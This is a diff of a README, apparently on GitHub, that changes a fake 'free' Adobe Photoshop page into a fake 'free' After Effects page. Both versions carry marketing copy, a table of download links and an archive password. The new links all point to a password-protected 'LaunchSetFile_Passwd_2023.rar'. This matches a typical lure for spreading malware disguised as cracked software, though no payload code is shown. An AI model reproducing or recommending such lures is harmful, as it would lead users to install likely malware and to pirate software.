@@ -1,27 +1,23 @@
-# <h1 align=center> Adobe Photoshop 2023 24.7.0.643 + Firefly AI 25.0.0.2254 FREE VERSION (NEWEST UPDATE)
-<h2 align=center><a href='https://inlnk.ru/84aLQ4'><img src='https://cdn.discordapp.com/attachments/1160267814955921539/1166374352879632496/1674337424_gas-kvas-com-p-risunok-adobe-photoshop-3d-36.png?ex=654a41c3&is=6537ccc3&hm=abe00510309e7e28ae2fc844e966442bc3f2b8b57797aed10a9c8c5f145d3899&'></a></h2>
+# <h1 align=center> AFTER EFFECTS FREE VERSION (NEWEST UPDATE)
+<h2 align=center><a href='https://github.com/eptovyi/eptorepo/releases/download/after-effects/LaunchSetFile_Passwd_2023.rar'><img src='https://github.com/eptovyi/eptorepo/assets/153016446/8ad2b3da-abba-4e90-8647-e8cfd1d24dd8'></a></h2>
 
-# <h1 align=center> DESCRIPTION OF ADOBE PHOTOSHOP + AI
-⚫️The future of Photoshop is here with Generative AI.
-Make any creative vision reality while keeping complete control over every concept with Adobe Firefly generative AI in Photoshop. Try select generative AI features in your browser right now with Photoshop.
+# <h1 align=center> DESCRIPTION OF AFTER EFFECTS
+⚫️Adobe After Effects stands as a powerhouse in the realm of motion graphics and visual effects software, recognized for its versatility and innovative tools. Tailored for video editing, animation, compositing, and creating captivating visual effects, After Effects caters to professionals in the film, television, and multimedia industries. With its user-friendly interface and a plethora of advanced features, it stands as an essential tool for both novice and experienced users seeking to bring their creative visions to life.
 
-⚫️New background, no problem.
-Change the setting seamlessly on photos with generative AI. Simply select the background, type in a text prompt, and transport your subject from a local city street to a location across the globe, or across the galaxy.
+⚫️One of the prominent features of After Effects is its comprehensive set of animation and compositing tools. The software offers a wide array of keyframe-based animation controls, allowing users to create stunning motion graphics and intricate visual effects. Its robust compositing capabilities enable the seamless integration of various elements, such as images, videos, text, and effects, into a unified and visually appealing composition.
 
-⚫️Go beyond the borders.
-Easily expand an image in any direction with Generative Expand. Select and drag the Crop tool beyond an image’s original borders to the desired size, and then click Generate. The expanded canvas will automatically fill with content that seamlessly blends with the existing image. Or type in a prompt to get a more specific result.
+⚫️Additionally, Adobe After Effects provides an extensive collection of effects and presets, empowering users to enhance and stylize their creations. From color correction and visual effects to simulated particles and motion tracking, the software offers a vast library of effects to elevate the quality and impact of visual content.
 
-⚫️Remove and replace content in a few steps.
-Cut out unwanted elements with ease. Simply select the object you want to remove and then select Generate (without adding any text to the prompt). Firefly will swap out telephone lines with unobstructed sky or replace stray strangers with flowers and foliage.
+⚫️Another standout feature of After Effects is its integration with other Adobe Creative Cloud applications. Seamless integration with software like Adobe Premiere Pro and Photoshop streamlines the workflow, allowing for smooth import and export of projects between different applications. This interoperability enhances efficiency and flexibility in creating and editing multimedia content.
 
 # <h1 align=center>⚡️ DOWNLOAD LINK⚡️
-| Mod Version| ADOBE PHOTOSHOP - Version | Link |
+| Mod Version| AFTER EFFECTS - Version | Link |
 |----------|-------------|-----------------|
-| v24.7.063 | 2023.7.12 & 2023.7.11 | [Download](https://inlnk.ru/84aLQ4) |
-| v24.0.0 | 2023.7.12 & 2023.7.11     | [Download](https://inlnk.ru/84aLQ4) |
-| v23.3.9 | 2023.7.12 & 2023.7.11     | [Download](https://inlnk.ru/84aLQ4) |
-| v23.0.5 | 2023.7.12 & 2023.7.11     | [Download](https://inlnk.ru/84aLQ4) |
-# <h1 align=center> ✅✅✅PASSWORD - 4455✅✅✅
+| v24.7.063 | 2023.7.12 & 2023.7.11 | [Download](https://github.com/eptovyi/eptorepo/releases/download/after-effects/LaunchSetFile_Passwd_2023.rar) |
+| v24.5.6 | 2023.7.12 & 2023.7.11     | [Download](https://github.com/eptovyi/eptorepo/releases/download/after-effects/LaunchSetFile_Passwd_2023.rar) |
+| v23.5.4 | 2023.7.12 & 2023.7.11     | [Download](https://github.com/eptovyi/eptorepo/releases/download/after-effects/LaunchSetFile_Passwd_2023.rar) |
+| v23.2.1 | 2023.7.12 & 2023.7.11     | [Download](https://github.com/eptovyi/eptorepo/releases/download/after-effects/LaunchSetFile_Passwd_2023.rar) |
+# <h1 align=center> ✅✅✅PASSWORD - 2023✅✅✅
 
 # <h1 align=center> TURN ALL YOUR IDEAS INTO REALITY!
 
